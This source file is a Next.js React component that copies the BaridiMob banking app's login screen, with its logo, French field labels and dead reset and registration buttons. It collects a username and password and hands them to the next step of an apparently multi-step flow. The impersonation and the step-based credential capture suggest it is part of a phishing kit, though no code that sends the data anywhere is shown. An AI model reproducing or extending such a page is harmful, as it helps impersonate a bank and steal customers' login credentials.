"use client"

import { useState } from "react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import Image from "next/image"

interface StepBaridiMobLoginProps {
  onNext: (data: LoginData) => void
  currentStep: number
}

export interface LoginData {
  username: string
  password: string
}

export function StepBaridiMobLogin({ onNext, currentStep }: StepBaridiMobLoginProps) {
  const [formData, setFormData] = useState<LoginData>({
    username: "",
    password: "",
  })

  const isValid = formData.username.length > 0 && formData.password.length > 0

  return (
    <div className="min-h-screen bg-gradient-to-b from-[#e8e8e8] to-[#f0f0f0] flex flex-col items-center justify-center px-4 py-8">
      {/* Logo */}
      <div className="mb-8 mt-4">
        <Image
          src={process.env.NEXT_PUBLIC_BARIDIMOB_LOGIN_LOGO || "/images/baridimob-logo.png"}
          alt="شعار بريدي موب"
          width={120}
          height={80}
          className="object-contain"
          priority
        />
      </div>

      {/* Form Container */}
      <div className="w-full max-w-md bg-white rounded-lg border-2 border-gray-400 p-6 shadow-lg">
        {/* Username Field */}
        <div className="mb-5">
          <label className="block text-gray-700 text-sm font-medium mb-2">
            Entrer l&apos;identifiant:
          </label>
          <Input
            type="text"
            value={formData.username}
            onChange={(e) => setFormData((prev) => ({ ...prev, username: e.target.value }))}
            placeholder=""
            className="w-full h-10 border border-gray-300 rounded px-3 py-2 text-gray-800 text-sm focus:outline-none focus:ring-2 focus:ring-blue-400 focus:border-transparent"
          />
        </div>

        {/* Password Field */}
        <div className="mb-4">
          <label className="block text-gray-700 text-sm font-medium mb-2">
            Entrer le mot de passe:
          </label>
          <Input
            type="password"
            value={formData.password}
            onChange={(e) => setFormData((prev) => ({ ...prev, password: e.target.value }))}
            placeholder=""
            className="w-full h-10 border border-gray-300 rounded px-3 py-2 text-gray-800 text-sm focus:outline-none focus:ring-2 focus:ring-blue-400 focus:border-transparent"
          />
        </div>

        {/* Reset Password Link & Continue Button */}
        <div className="flex items-center justify-between mb-4">
          <button className="text-gray-600 text-xs hover:text-gray-800 transition-colors">
            Réinitialiser le mot de passe
          </button>
          <Button
            onClick={() => onNext(formData)}
            disabled={!isValid}
            className="bg-[#1a3a52] hover:bg-[#0f2839] text-white font-semibold px-6 py-2 h-auto text-sm rounded transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
          >
            Continuer
          </Button>
        </div>
      </div>

      {/* Terms & Conditions */}
      <div className="text-center px-4 py-6 max-w-md">
        <p className="text-gray-700 text-xs leading-relaxed">
          En entrant dans l&apos;application, vous confirmez votre accord aux{" "}
          <button className="text-gray-700 underline hover:text-gray-900 transition-colors">
            conditions d&apos;accès
          </button>
          .
        </p>
      </div>

      {/* Registration Link */}
      <div className="flex items-center gap-2 justify-center">
        <span className="text-red-600 text-xl font-bold">▶</span>
        <button className="bg-red-100 border border-red-400 text-red-600 px-4 py-1 rounded text-sm font-medium hover:bg-red-200 transition-colors">
          Aller à l&apos;enregistrement.
        </button>
      </div>
    </div>
  )
}
